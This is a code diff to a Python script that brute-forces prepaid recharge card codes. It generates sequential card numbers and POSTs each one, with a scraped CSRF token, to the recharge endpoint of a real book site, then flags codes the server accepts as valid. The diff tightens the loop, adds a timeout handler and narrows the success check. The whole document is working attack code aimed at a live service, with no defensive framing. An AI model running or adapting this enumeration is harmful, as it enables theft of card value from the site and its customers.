@@ -83,15 +83,24 @@ class booksgcc:
         ulen=18-plen
         fs="%0."+str(ulen)+'d'
         csrf=""
-        for i in range(1,nums+start):
-            suffix=fs %i
+        i=0
+        #for i in range(start,nums+start):
+        while i<=nums:
+            suffix=fs %(start+i)
             card=prefix+suffix
             postdt="CSRFToken=%s&cardCode=%s" %(csrf,card)
             self.objc.setopt(pycurl.POSTFIELDS,postdt)
-            head,body=lib_http.getdata4info("http://book.sgcc.com.cn/usercenter/recharge",objc=self.objc)
+            try:
+                head,body=lib_http.getdata4info("http://book.sgcc.com.cn/usercenter/recharge",objc=self.objc)
+            except Exception:
+                lib_func.printstr("Time out for %s" %postdt)
+                continue
             rs=self.getresult(body)
-            if rs in ('2','3','4'):
-                lib_func.printstr("have a vaild cardcode,this flag is %d" %rs)
+            if rs=='4':
+                lib_func.printstr("have a vaild cardcode found %s" %rs)
+            if rs:
+                #print suffix,rs
+                i+=1
             csrf=self.getcsrftoken(body)
             
     def getresult(self,body):
